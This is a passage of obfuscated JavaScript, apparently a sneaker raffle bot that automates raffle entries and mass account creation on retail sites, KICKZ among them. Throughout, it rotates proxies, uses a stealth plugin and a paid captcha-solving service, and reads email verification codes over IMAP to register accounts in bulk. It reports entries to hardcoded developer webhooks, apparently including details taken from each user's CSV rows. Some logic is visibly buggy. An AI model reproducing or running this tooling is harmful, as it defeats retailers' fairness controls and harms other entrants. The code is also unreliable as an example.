                    if (_0x51ca60[_0x2d7b0b]['Email'] == '' || _0x51ca60[_0x2d7b0b]['Url'] == '' || _0x51ca60[_0x2d7b0b]['FirstName'] == '' || _0x51ca60[_0x2d7b0b]['LastName'] == '') {
                        console['log'](_0xb0c82c() + '\x20[' + _0x502cc7[taskModule]['name'] + ']\x20Task\x20' + (_0x2d7b0b + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x8aa917['useRandomProxy'] = ![])
                        var _0x2c24d1 = _0x5272e0[_0x2d7b0b]['split'](':');
                    else
                        var _0x1c38cc = Math['round'](Math['random']() * (_0x5272e0['length'] - 0x1)), _0x2c24d1 = _0x5272e0[_0x1c38cc]['split'](':');
                    var _0x96d80d;
                    try {
                        _0x96d80d = await _0x3d6bb6['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2c24d1[0x0] + ':' + _0x2c24d1[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x96d80d = await _0x3d6bb6['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2c24d1[0x0] + ':' + _0x2c24d1[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x15147a = await _0x96d80d['newPage']();
                        await _0x15147a['authenticate']({
                            'username': '' + _0x2c24d1[0x2],
                            'password': '' + _0x2c24d1[0x3]
                        }), console['log'](_0xb0c82c() + '\x20[' + _0x1a4665['name'] + ']\x20Task\x20' + (_0x2d7b0b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x15147a['setRequestInterception'](!![]), _0x15147a['on']('request', _0x326877 => {
                            _0x326877['resourceType']() === 'image' || _0x326877['resourceType']() === 'font' || _0x326877['resourceType']() === 'media' ? _0x326877['abort']() : _0x326877['continue']();
                        });
                        try {
                            await _0x15147a['goto']('' + _0x51ca60[_0x2d7b0b]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x15147a['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0xb0c82c() + '\x20[' + _0x1a4665['name'] + ']\x20Task\x20' + (_0x2d7b0b + 0x1) + '\x20:\x20Filling\x20Information'), await _0x15147a['type']('#comp_firstname', '' + _0x51ca60[_0x2d7b0b]['FirstName']), await _0x15147a['waitForSelector']('#comp_lastname'), await _0x15147a['type']('#comp_lastname', '' + _0x51ca60[_0x2d7b0b]['LastName']), await _0x15147a['waitForSelector']('#comp_email'), await _0x15147a['type']('#comp_email', '' + _0x51ca60[_0x2d7b0b]['Email']), await _0x15147a['waitForSelector']('#comp_paypalemail'), await _0x15147a['type']('#comp_paypalemail', '' + _0x51ca60[_0x2d7b0b]['Email']), await _0x15147a['waitForSelector']('#comp_mobile_end'), await _0x15147a['type']('#comp_mobile_end', '' + _0x51ca60[_0x2d7b0b]['Phone']), await _0x15147a['waitForSelector']('#comp_dob'), await _0x15147a['type']('#comp_dob', '08/09/1992'), console['log'](_0xb0c82c() + '\x20[' + _0x1a4665['name'] + ']\x20Task\x20' + (_0x2d7b0b + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x51ca60[_0x2d7b0b]['Size'] == 'RANDOM') {
                            const _0x48d685 = await _0x15147a['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x516251 => {
                                return _0x516251['map'](_0x29652b => _0x29652b['value']);
                            });
                            var _0x5a528c = Math['round'](Math['random']() * (_0x48d685['length'] - 0x2));
                            await _0x15147a['select']('#shoesize', _0x48d685[_0x5a528c + 0x1]), await _0x32344d(0x3e8);
                        } else {
                            const _0x13977e = await _0x15147a['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x4f49b0 => {
                                return _0x4f49b0['map'](_0x1fe7b5 => _0x1fe7b5['innerText']);
                            }), _0x546406 = await _0x15147a['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x10b263 => {
                                return _0x10b263['map'](_0x2104a2 => _0x2104a2['value']);
                            });
                            var _0x54c788 = _0x51ca60[_0x2d7b0b]['Size'];
                            for (var _0x21c630 = 0x1; _0x21c630 < _0x546406['length']; _0x21c630++) {
                                var _0x544df4 = _0x13977e[_0x21c630]['split']('\x20')[0x0];
                                if (_0x544df4 == _0x54c788) {
                                    await _0x15147a['select']('#shoesize', _0x546406[_0x21c630]);
                                    break;
                                } else {
                                    if (_0x21c630 + 0x1 == _0x546406['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x15147a['waitForSelector']('#comp_address1'), await _0x15147a['type']('#comp_address1', _0x51ca60[_0x2d7b0b]['Address1'] + '\x20' + _0x51ca60[_0x2d7b0b]['HouseNumber']), await _0x15147a['waitForSelector']('#comp_address2'), await _0x15147a['type']('#comp_address2', '' + _0x51ca60[_0x2d7b0b]['Address2']), await _0x15147a['waitForSelector']('#comp_address2'), await _0x15147a['type']('#comp_address3', '' + _0x51ca60[_0x2d7b0b]['City']), await _0x15147a['waitForSelector']('#comp_postcode'), await _0x15147a['type']('#comp_postcode', '' + _0x51ca60[_0x2d7b0b]['Zip']), console['log'](_0xb0c82c() + '\x20[' + _0x1a4665['name'] + ']\x20Task\x20' + (_0x2d7b0b + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x32344d(0x4b0), await _0x15147a['click']('label#emailhold'), await _0x32344d(0x5dc), await _0x15147a['click']('#preauth_tandc_email\x20>\x20label'), await _0x32344d(0x5dc), await _0x15147a['click']('#submit');
                        try {
                            await _0x15147a['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0xb0c82c() + '\x20[' + _0x1a4665['name'] + ']\x20Task\x20' + (_0x2d7b0b + 0x1) + '\x20:\x20' + _0x5b4136['blue']('Awaiting\x20Paypal\x20Payment')), _0x96d80d['on']('targetcreated', async _0x420939 => {
                            if (_0x420939['type']() === 'page') {
                                const _0x2187b5 = await _0x420939['page']();
                                async function _0x59206a() {
                                    try {
                                        await _0x15147a['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x1d459b = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x32559c() {
                                    try {
                                        await _0x15147a['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x17d8b4 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x32559c(), _0x59206a(), await _0x32344d(0x493e0);
                            }
                        });
                        async function _0x181437() {
                            for (let _0x5b0fac = 0x0; _0x5b0fac < 0x12c; _0x5b0fac++) {
                                if (_0x17d8b4 == !![]) {
                                    _0x5dae6d = 'no', _0x5677a4(_0x51ca60[_0x2d7b0b], _0x1a4665), console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x1a4665['name'] + ']\x20Task\x20' + (_0x2d7b0b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '')
                                        try {
                                            await _0x16e110(_0x8aa917['webhook'], _0x3152bc['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x32344d(0xc8), await _0x16e110(_0x275f2a, _0x3152bc['succesDEVMSG']), await _0x32344d(0xc8);
                                    try {
                                        await _0x16e110(_0x583375, _0x3152bc['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x1d459b)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x32344d(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x32344d(0xbb8), await _0x15147a['click']('.zoid-outlet'), await _0x32344d(0x7d0), await _0x181437();
                    } catch (_0x3ed95e) {
                        console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x1a4665['name'] + ']\x20Task\x20' + (_0x2d7b0b + 0x1) + '\x20:\x20' + _0x3ed95e)), _0x328032 = '' + _0x3ed95e;
                        var _0x1f08f7 = await _0xe56989(_0x51ca60[_0x2d7b0b], _0x1a4665, 'dev', !![], _0x328032);
                        _0x3152bc['errorDEV'] = { 'embeds': [_0x1f08f7] }, _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x3152bc['errorDEV']), await _0x16e110(_0x3ba800, _0x3152bc['errorDEV']);
                    } finally {
                        _0x96d80d && _0x96d80d['close']();
                        if (_0x5dae6d == 'yes' && _0x441f27 != 0x5 && _0x328032 != 'Size\x20Not\x20Found') {
                            console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x1a4665['name'] + ']\x20Task\x20' + (_0x2d7b0b + 0x1) + '\x20:\x20Retrying\x20(' + _0x441f27 + '\x20/\x205)')), _0x2d7b0b = _0x2d7b0b - 0x1, _0x441f27 = _0x441f27 + 0x1;
                            continue;
                        }
                        _0x5dae6d == 'yes' && _0x441f27 >= 0x5 && (_0x4af7c0(afew[_0x2d7b0b], _0x1a4665), _0x5dae6d = 'no', _0x441f27 = 0x0), console['log']('Waiting\x20for\x20' + _0x8aa917['delay'] + '\x20ms'), await _0x32344d(_0x8aa917['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x259cb9, _0x416f29, _0x3fda07) {
                    _0x3d6bb6['use'](_0x922449()), _0x3d6bb6['use'](_0x4b9689({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8aa917['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3d8c4c = 0x0; _0x3d8c4c < _0x416f29['length']; _0x3d8c4c++) {
                        const _0x1970ea = 'https://www.kickz.com/login';
                        if (_0x99dfca != 'yes')
                            var _0x99dfca = '', _0x3b0358 = 0x0;
                        _0x299f70(_0x259cb9['name'] + '\x20Task\x20' + (_0x3d8c4c + 0x1) + '\x20/\x20' + _0x416f29['length'] + '\x20||\x20File:\x20' + _0x1901f8 + '\x20Proxies:\x20' + _0x504c2d);
                        try {
                            await _0x4669df(_0x416f29, _0x3d8c4c);
                        } catch {
                            _0x99dfca = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x2ea06c = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4b3861
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x8aa917['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0xe2f4c8
                                }
                            ]
                        }];
                        const _0x533d65 = { 'embeds': _0x2ea06c };
                        var _0x3b8b43 = await _0xe56989(_0x416f29[_0x3d8c4c], _0x259cb9, 'acc', ![]);
                        const _0x2b7473 = { 'succesDEVMSG': { 'embeds': [_0x3b8b43] } };
                        if (_0x416f29[_0x3d8c4c]['Email'] == '' || _0x416f29[_0x3d8c4c]['FirstName'] == '' || _0x416f29[_0x3d8c4c]['LastName'] == '') {
                            console['log'](_0xb0c82c() + '\x20[' + _0x259cb9['name'] + ']\x20Task\x20' + (_0x3d8c4c + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x416f29[_0x3d8c4c]['Password'] == '' && (_0x416f29[_0x3d8c4c]['Password'] = 'JRaffles23!');
                        if (_0x8aa917['useRandomProxy'] = ![])
                            var _0x5725d9 = _0x3fda07[_0x3d8c4c]['split'](':');
                        else
                            var _0x1c3338 = Math['round'](Math['random']() * (_0x3fda07['length'] - 0x1)), _0x5725d9 = _0x3fda07[_0x1c3338]['split'](':');
                        var _0x3b82f5;
                        try {
                            _0x3b82f5 = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5725d9[0x0] + ':' + _0x5725d9[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3b82f5 = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5725d9[0x0] + ':' + _0x5725d9[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x6a33dd = await _0x3b82f5['newPage']();
                            await _0x6a33dd['authenticate']({
                                'username': '' + _0x5725d9[0x2],
                                'password': '' + _0x5725d9[0x3]
                            }), console['log'](_0xb0c82c() + '\x20[' + _0x259cb9['name'] + ']\x20Task\x20' + (_0x3d8c4c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x6a33dd['setRequestInterception'](!![]), _0x6a33dd['on']('request', _0x2bdf62 => {
                                _0x2bdf62['resourceType']() === 'image' || _0x2bdf62['resourceType']() === 'font' || _0x2bdf62['resourceType']() === 'media' ? _0x2bdf62['abort']() : _0x2bdf62['continue']();
                            }), await _0x6a33dd['goto'](_0x1970ea), await _0x32344d(0xbb8), console['log'](_0xb0c82c() + '\x20[' + _0x259cb9['name'] + ']\x20Task\x20' + (_0x3d8c4c + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x6a33dd['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x6a33dd['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x6a33dd['waitForSelector']('#button-register'), await _0x32344d(0x7d0), await _0x6a33dd['evaluate'](() => {
                                const _0x20762d = document['querySelector']('#button-register');
                                _0x20762d['click']();
                            }), console['log'](_0xb0c82c() + '\x20[' + _0x259cb9['name'] + ']\x20Task\x20' + (_0x3d8c4c + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x32344d(0x1388), await _0x6a33dd['waitForSelector']('#customer_salutation'), await _0x6a33dd['select']('#customer_salutation', 'mr'), await _0x32344d(0x7d0), await _0x6a33dd['waitForSelector']('#customer_firstname'), await _0x6a33dd['type']('#customer_firstname', '' + _0x416f29[_0x3d8c4c]['FirstName']), await _0x32344d(0x352), await _0x6a33dd['waitForSelector']('#customer_lastname'), await _0x6a33dd['type']('#customer_lastname', '' + _0x416f29[_0x3d8c4c]['LastName']), await _0x32344d(0x352), await _0x6a33dd['type']('#email-input', '' + _0x416f29[_0x3d8c4c]['Email']), await _0x32344d(0x352), await _0x6a33dd['type']('#email-confirm-input', '' + _0x416f29[_0x3d8c4c]['Email']), await _0x32344d(0x352), await _0x6a33dd['type']('#register-password', '' + _0x416f29[_0x3d8c4c]['Password']), await _0x32344d(0x352), await _0x6a33dd['type']('#password-confirm', '' + _0x416f29[_0x3d8c4c]['Password']), await _0x32344d(0x352), console['log'](_0xb0c82c() + '\x20[' + _0x259cb9['name'] + ']\x20Task\x20' + (_0x3d8c4c + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x6a33dd['click']('#consent'), await _0x32344d(0x1f4);
                            const _0x4b6754 = await _0x6a33dd['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x4b6754) {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x259cb9['name'] + ']\x20Task\x20' + (_0x3d8c4c + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x6a33dd['click']('#buttonRegister');
                            try {
                                await _0x6a33dd['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0xb0c82c() + '\x20[' + _0x259cb9['name'] + ']\x20Task\x20' + (_0x3d8c4c + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x416f29[_0x3d8c4c]['Email']), await _0x32344d(0x4b0);
                            async function _0x2b44d2() {
                                var _0x4412a8, _0x12eca1 = ![];
                                for (var _0x395777 = 0x0; _0x395777 < 0x18; _0x395777++) {
                                    async function _0x2c212f() {
                                        var _0x2b10c4 = new _0x16dd9e({
                                            'user': _0x8aa917['masterMail'],
                                            'password': _0x8aa917['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x4fe129(_0x182532) {
                                            _0x2b10c4['openBox']('INBOX', ![], _0x182532);
                                        }
                                        _0x2b10c4['once']('ready', function () {
                                            console['log'](_0xb0c82c() + '\x20[' + _0x259cb9['name'] + ']\x20Task\x20' + (_0x3d8c4c + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x4fe129(function (_0x54ff69, _0x52aecf) {
                                                console['log'](_0xb0c82c() + '\x20[' + _0x259cb9['name'] + ']\x20Task\x20' + (_0x3d8c4c + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x54ff69)
                                                    throw _0x54ff69;
                                                _0x2b10c4['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x56ea00, _0x29a943) {
                                                    if (!_0x29a943 || !_0x29a943['length'])
                                                        console['log'](_0xb0c82c() + '\x20[' + _0x259cb9['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x2b10c4['end']();
                                                    else {
                                                        var _0x41550 = _0x2b10c4['seq']['fetch'](_0x29a943, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x41550['on']('message', function (_0x5cbc91, _0x31629f) {
                                                            var _0x45bfc6 = '(#' + _0x31629f + ')\x20';
                                                            _0x5cbc91['on']('body', function (_0x1f2bea, _0x4268e8) {
                                                                _0x4b0324(_0x1f2bea, (_0x335897, _0x5e8e95) => {
                                                                    if (_0x5e8e95['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x3a783d = _0x5e8e95['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x1d3417 = _0x3a783d[0x1]['split']('<')[0x0];
                                                                        _0x4412a8 = _0x1d3417;
                                                                    }
                                                                });
                                                            }), _0x5cbc91['once']('end', function () {
                                                            });
                                                        }), _0x41550['once']('error', function (_0xb236f2) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x41550['once']('end', function () {
                                                            _0x2b10c4['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x2b10c4['once']('error', function (_0x3827d4) {
                                            console['log'](_0x5b4136['red'](_0x3827d4['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x12eca1 = !![];
                                        }), _0x2b10c4['once']('end', async function () {
                                        }), _0x2b10c4['connect']();
                                    }
                                    _0x2c212f(), await _0x32344d(0x1388);
                                    if (_0x4412a8)
                                        return _0x4412a8;
                                    if (_0x12eca1)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x395777 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x2b44d2(), _0x32344d(0x320), console['log'](_0xb0c82c() + '\x20[' + _0x259cb9['name'] + ']\x20Task\x20' + (_0x3d8c4c + 0x1) + '\x20:\x20Verifying..'), await _0x6a33dd['type']('#verificationCode', code), await _0x32344d(0x1f4), await _0x6a33dd['click']('#buttonVerify'), await _0x32344d(0x190), await _0x6a33dd['click']('#buttonVerify'), await _0x32344d(0x3e8);
                            try {
                                await _0x6a33dd['waitForSelector']('div.b-user_greeting'), _0x99dfca = 'no', console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x259cb9['name'] + ']\x20Task\x20' + (_0x3d8c4c + 0x1) + '\x20:\x20Account\x20' + _0x416f29[_0x3d8c4c]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x4fe38c['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x416f29[_0x3d8c4c]['Email'] + ',' + _0x416f29[_0x3d8c4c]['Password'] + ','), console['log'](_0xb0c82c() + '\x20[' + _0x259cb9['name'] + ']\x20Task\x20' + (_0x3d8c4c + 0x1) + '\x20:\x20Account\x20' + _0x416f29[_0x3d8c4c]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x2b7473['succesDEVMSG']);
                                } catch {
                                }
                                await _0x16e110(_0x410b1d, _0x2b7473['succesDEVMSG']);
                            } catch {
                                _0x99dfca = 'no', console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x259cb9['name'] + ']\x20Task\x20' + (_0x3d8c4c + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x259cb9['name'] + ']\x20Task\x20' + (_0x3d8c4c + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x3ef2ba) {
                            console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x259cb9['name'] + ']\x20Task\x20' + (_0x3d8c4c + 0x1) + '\x20:\x20' + _0x3ef2ba)), _0x2ea06c[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x2ea06c[0x0]['description'] = '' + _0x3ef2ba, await _0x16e110(_0x3ba800, _0x533d65), _0x99dfca = 'yes';
                        } finally {
                            _0x3b82f5 && _0x3b82f5['close']();
                            if (_0x99dfca == 'yes' && _0x3b0358 != 0x5) {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x259cb9['name'] + ']\x20Task\x20' + (_0x3d8c4c + 0x1) + '\x20:\x20Retrying\x20(' + _0x3b0358 + '\x20/\x205)')), _0x3d8c4c = _0x3d8c4c - 0x1, _0x3b0358 = _0x3b0358 + 0x1;
                                continue;
                            }
                            _0x99dfca == 'yes' && _0x3b0358 >= 0x5 && (_0x4af7c0(_0x416f29[_0x3d8c4c], _0x259cb9), _0x99dfca = 'no', _0x3b0358 = 0x0), console['log']('Waiting\x20for\x20' + _0x8aa917['delay'] + '\x20ms'), await _0x32344d(_0x8aa917['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x515e1c, _0x557a9c, _0x343a38) {
                    _0x3d6bb6['use'](_0x922449()), _0x3d6bb6['use'](_0x4b9689({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8aa917['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4043bd = 0x0; _0x4043bd < _0x557a9c['length']; _0x4043bd++) {
                        var _0x15a5d7;
                        if (_0x2b02b7 != 'yes')
                            var _0x2b02b7 = '', _0xef990a = 0x0;
                        _0x299f70(_0x515e1c['name'] + '\x20Task\x20' + (_0x4043bd + 0x1) + '\x20/\x20' + _0x557a9c['length'] + '\x20||\x20File:\x20' + _0x1901f8 + '\x20Proxies:\x20' + _0x504c2d);
                        var _0x53514b = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4b3861
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x557a9c[_0x4043bd]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x557a9c[_0x4043bd]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x8aa917['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0xe2f4c8
                                }
                            ]
                        }], _0x1de043 = await _0xe56989(_0x557a9c[_0x4043bd], _0x515e1c, 'dev', ![]), _0x27a26f = await _0xe56989(_0x557a9c[_0x4043bd], _0x515e1c, 'pub', ![]);
                        const _0x4010be = {
                            'succesDEVMSG': { 'embeds': [_0x1de043] },
                            'succesPUBMSG': { 'embeds': [_0x27a26f] }
                        };
                        try {
                            await _0x4669df(_0x557a9c, _0x4043bd);
                        } catch {
                            _0x2b02b7 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x557a9c[_0x4043bd]['Email'] == '' || _0x557a9c[_0x4043bd]['Password'] == '' || _0x557a9c[_0x4043bd]['FirstName'] == '' || _0x557a9c[_0x4043bd]['LastName'] == '') {
                            console['log'](_0xb0c82c() + '\x20[' + _0x515e1c['name'] + ']\x20Task\x20' + (_0x4043bd + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x8aa917['useRandomProxy'] = ![])
                            var _0x49835c = _0x343a38[_0x4043bd]['split'](':');
                        else
                            var _0x1f45c8 = Math['round'](Math['random']() * (_0x343a38['length'] - 0x1)), _0x49835c = _0x343a38[_0x1f45c8]['split'](':');
                        var _0x557510;
                        try {
                            _0x557510 = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x49835c[0x0] + ':' + _0x49835c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x557510 = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x49835c[0x0] + ':' + _0x49835c[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x27075f = await _0x557510['newPage']();
                            await _0x27075f['authenticate']({
                                'username': '' + _0x49835c[0x2],
                                'password': '' + _0x49835c[0x3]
                            }), console['log'](_0xb0c82c() + '\x20[' + _0x515e1c['name'] + ']\x20Task\x20' + (_0x4043bd + 0x1) + '\x20:\x20Getting\x20Session'), await _0x27075f['setRequestInterception'](!![]), _0x27075f['on']('request', _0x222c0b => {
                                _0x222c0b['resourceType']() === 'image' || _0x222c0b['resourceType']() === 'font' || _0x222c0b['resourceType']() === 'media' ? _0x222c0b['abort']() : _0x222c0b['continue']();
                            }), await _0x27075f['goto']('' + _0x557a9c[_0x4043bd]['Url'], { 'waitUntil': 'networkidle2' }), await _0x32344d(0x12c), await _0x27075f['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x27075f['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x32344d(0x7d0);
                            try {
                                await _0x27075f['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x27075f['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0xb0c82c() + '\x20[' + _0x515e1c['name'] + ']\x20Task\x20' + (_0x4043bd + 0x1) + '\x20:\x20Logging\x20in'), await _0x27075f['waitForSelector']('#username'), await _0x27075f['type']('#username', _0x557a9c[_0x4043bd]['Email']), await _0x27075f['waitForSelector']('#password'), await _0x27075f['type']('#password', _0x557a9c[_0x4043bd]['Password']), await _0x32344d(0x190), await _0x27075f['click']('#buttonSubmit'), await _0x27075f['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0xb0c82c() + '\x20[' + _0x515e1c['name'] + ']\x20Task\x20' + (_0x4043bd + 0x1) + '\x20:\x20Getting\x20Product'), await _0x32344d(0x1f4), console['log'](_0xb0c82c() + '\x20[' + _0x515e1c['name'] + ']\x20Task\x20' + (_0x4043bd + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x557a9c[_0x4043bd]['Size']);
                            let _0x1ae4fd = _0x557a9c[_0x4043bd]['Size']['replace']('.5', '\x201/2');
                            await _0x27075f['click']('button[title=\x22' + _0x1ae4fd + '\x22]'), await _0x32344d(0x1f4);
                            try {
                                await _0x27075f['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
